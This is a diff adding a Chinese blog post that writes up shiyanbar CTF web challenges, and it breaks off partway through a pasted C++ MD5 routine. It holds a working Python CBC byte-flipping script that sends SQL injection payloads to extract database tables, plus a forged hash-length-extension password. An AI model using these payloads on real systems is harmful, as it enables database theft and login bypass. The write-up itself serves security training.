@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>实验吧之web（二） | AssassinQ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="ctfweb" />
+  
+  
+  
+  
+  <meta name="description" content="应该是实验吧最难的几道web吧。">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧之WEB（二）">
+<meta property="og:url" content="http://AssassinQ.com/2018/05/01/实验吧之WEB-二/index.html">
+<meta property="og:site_name" content="AssassinQ">
+<meta property="og:description" content="应该是实验吧最难的几道web吧。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://t1.aixinxi.net/o_1cd1lfvpg1qkd1j7d4781t9511hsa.png-j.jpg">
+<meta property="og:image" content="http://t1.aixinxi.net/o_1cd1kjmco1j171clo1dnn1iqh1chia.png-j.jpg">
+<meta property="og:updated_time" content="2018-07-03T10:36:48.674Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="实验吧之WEB（二）">
+<meta name="twitter:description" content="应该是实验吧最难的几道web吧。">
+<meta name="twitter:image" content="http://t1.aixinxi.net/o_1cd1lfvpg1qkd1j7d4781t9511hsa.png-j.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    <link rel="stylesheet" href="/css/dialog.css">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+    <link rel="stylesheet" href="/css/vdonate.css" >
+  
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/links">links</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/about">About</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-实验吧之WEB-二" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      实验吧之WEB（二）
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/05/01/实验吧之WEB-二/" class="article-date">
+	  <time datetime="2018-05-01T04:42:46.000Z" itemprop="datePublished">2018-05-01</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>应该是实验吧最难的几道web吧。</p>
+<a id="more"></a>
+<h1 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h1><p>格式：flag:{xxx}<br><a href="http://ctf5.shiyanbar.com/web/jiandan/index.php" target="_blank" rel="noopener">解题链接</a></p>
+<p>id中进行输入，发现=、#、union、like等被过滤。</p>
+<p>打开burpsuite抓包，发现服务器会返回iv和cipher两个值。<br>/Users/qianfei/MyBlog/source/images/简单的登录题.jpg</p>
+<p><img src="http://t1.aixinxi.net/o_1cd1lfvpg1qkd1j7d4781t9511hsa.png-j.jpg" alt="image"></p>
+<h2 id="iv"><a href="#iv" class="headerlink" title="iv"></a>iv</h2><p>随机生成的16位值，再经过base64转码</p>
+<h2 id="cipher"><a href="#cipher" class="headerlink" title="cipher"></a>cipher</h2><p>id序列化、预设的SECRET_KEY、上面得到的iv值，三者经过aes-128-cbc加密得到cipher值.</p>
+<p>然后用御剑扫描后，发现test.php。</p>
+<p>源码如下：<br><img src="http://t1.aixinxi.net/o_1cd1kjmco1j171clo1dnn1iqh1chia.png-j.jpg" alt="image"></p>
+<p>可知：</p>
+<p>1、如果Post给服务器的报文，没有包括id，而且cookie里有iv和cipher值，则进入函数show_homepage()；</p>
+<p>2、show_homepage()大致过程：将iv、cipher经过base64解码，然后把预设的SECRET_KEY（打码）、iv、cipher经过aes-128-cbc解密，得到plain；</p>
+<p>3、如果plain无法反序列化，则die并返回plain的base64编码数据；如果可以序列化，则将id值拼接到sql语句中“select * from users limit .$info[‘id’]  ,0”，并提交到数据库，返回数据，并附在返回的Hello后。</p>
+<p>用Burp Repeater尝试，将id=1;%00post提交，然后用返回的iv、cipher值，作为第二次的cookie，然后去掉“id=”再次post，结果能返回Hello!rootzz。</p>
+<p>剩下的有点难，献上<a href="http://hebin.me/2018/01/26/%E8%A5%BF%E6%99%AEctf-%E7%AE%80%E5%8D%95%E7%9A%84%E7%99%BB%E5%BD%95%E9%A2%98/" target="_blank" rel="noopener">pcat大佬的wp</a></p>
+<h2 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h2><p>这种方式通过损坏密文字节来改变明文字节。（注：借助CBC内部的模式）借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。</p>
+<p>参考网站：<br><a href="http://drops.xmd5.com/static/drops/tips-7828.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-7828.html</a></p>
+<p>pcat的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mydecode</span><span class="params">(value)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> b64decode(urllib.unquote(value))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myencode</span><span class="params">(value)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> urllib.quote(b64encode(value))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mycbc</span><span class="params">(value,idx,c1,c2)</span>:</span></span><br><span class="line">    lst=list(value)</span><br><span class="line">    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(lst)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pcat</span><span class="params">(payload,idx,c1,c2)</span>:</span></span><br><span class="line">    url=<span class="string">r'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span></span><br><span class="line">    myd=&#123;<span class="string">'id'</span>:payload&#125;</span><br><span class="line">    res=requests.post(url,data=myd)</span><br><span class="line">    cookies=res.headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line"></span><br><span class="line">    iv=re.findall(<span class="string">r'iv=(.*?),'</span>,cookies)[<span class="number">0</span>]</span><br><span class="line">    cipher=re.findall(<span class="string">r'cipher=(.*)'</span>,cookies)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    iv_raw=mydecode(iv)</span><br><span class="line">    cipher_raw=mydecode(cipher)</span><br><span class="line"></span><br><span class="line">    cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))</span><br><span class="line">    cookies_new=&#123;<span class="string">'iv'</span>:iv,<span class="string">'cipher'</span>:cipher_new&#125;</span><br><span class="line">    cont=requests.get(url,cookies=cookies_new).content</span><br><span class="line">    plain=b64decode(re.findall(<span class="string">r"base64_decode\('(.*?)'\)"</span>,cont)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    first=<span class="string">'a:1:&#123;s:2:"id";s:'</span></span><br><span class="line">    iv_new=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        iv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">    iv_new=myencode(iv_new)</span><br><span class="line"></span><br><span class="line">    cookies_new=&#123;<span class="string">'iv'</span>:iv_new,<span class="string">'cipher'</span>:cipher_new&#125;</span><br><span class="line">    cont=requests.get(url,cookies=cookies_new).content</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Payload:%s\n&gt;&gt; '</span> %(payload)</span><br><span class="line">    <span class="keyword">print</span> cont</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    pcat(<span class="string">'12'</span>,<span class="number">4</span>,<span class="string">'2'</span>,<span class="string">'#'</span>)</span><br><span class="line">    pcat(<span class="string">'0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'</span>+chr(<span class="number">0</span>),<span class="number">6</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">    pcat(<span class="string">'0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'</span>+chr(<span class="number">0</span>),<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">    pcat(<span class="string">"0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);"</span>+chr(<span class="number">0</span>),<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">    pcat(<span class="string">"0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);"</span>+chr(<span class="number">0</span>),<span class="number">6</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'ok'</span></span><br></pre></td></tr></table></figure>
+<p>这道题用到了cbc字节翻转攻击，还用到了php的序列化函数，一下子真的很难消化。</p>
+<h1 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h1><p>相信你一定能拿到想要的<br>Hint:你可能希望知道服务器端发生了什么。。<br>格式：CTF{}<br><a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">解题链接</a></p>
+<p>burpsuite抓包之后，将包中cookies里的source=0改成source=1。</p>
+<p>得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据源码可以得到：username为admin，password不能是admin，添加cookies，且其变量名为getmein。</p>
+<p>simple-hash的值是secret+adminadmin经过md5加密得到，且secret的长度为15字节。</p>
+<h2 id="md5加密原理"><a href="#md5加密原理" class="headerlink" title="md5加密原理"></a>md5加密原理</h2><p>MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。</p>
+<p>在MD5算法中，首先需要对信息进行填充，使其字节长度对512求余数的结果等于448。因此，信息的字节长度（Bits Length）将被扩展至N<em>512+448，即N</em>64+56个字节（Bytes），N为一个正整数。填充的方法如下，在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。然后再在这个结果后面附加一个以64位二进制表示的填充前的信息长度。经过这两步的处理，现在的信息字节长度=N<em>512+448+64=(N+1)</em>512，即长度恰好是512的整数倍数。这样做的原因是为满足后面处理中对信息长度的要求。MD5中有四个32位被称作链接变量（Chaining Variable）的整数参数，他们分别为：A=0x01234567，B=0x89abcdef，C=0xfedcba98，D=0x76543210。当设置好这四个链接变量后，就开始进入算法的四轮循环运算，循环的次数是信息中512位信息分组的数目。</p>
+<h2 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h2><p>哈希长度扩展攻击适用于加密情况为：hash($SECRET, $message)的情况，其中 hash 最常见的就是 md5、hash1。我们可以在不知道$SECRET的情况下推算出另外一个匹配的值。</p>
+<p>参考网站：<br><a href="https://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="noopener">https://blog.csdn.net/syh_486_007/article/details/51228628</a></p>
+<p>通过上面知识的学习，可以对题目有一个更加好的理解。</p>
+<p>接来下需要做的是将secret+adminadmin进行填充，对其进行第二轮复杂的数学计算来得到getmein的hash值。</p>
+<p>先构造出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxxadminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00xxxxx</span><br></pre></td></tr></table></figure>
+<p>构造出post的data为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin</span><br><span class="line">password:admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00xxxxx</span><br></pre></td></tr></table></figure>
+<p>还要再反urldecode一下，将\x换成%。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adminadmin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00xxxxx</span><br></pre></td></tr></table></figure>
+<p>接下来的重头戏便是获取其hash值（md5的原理还不会实现，大佬的脚本直接拿来用）。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN = <span class="number">1e6</span> + <span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> uint;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MD5</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(MD5::*deal_fun)</span><span class="params">(uint&amp;, uint, uint, uint, uint, uint, uint)</span></span>;<span class="comment">//用于定义函数指针数组</span></span><br><span class="line">    <span class="built_in">string</span> init_str;<span class="comment">//数据字符串</span></span><br><span class="line">    uint init_arr[<span class="number">1000</span>];<span class="comment">//最终的数据数组&#123;进行扩充处理后的数据&#125;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">static</span> 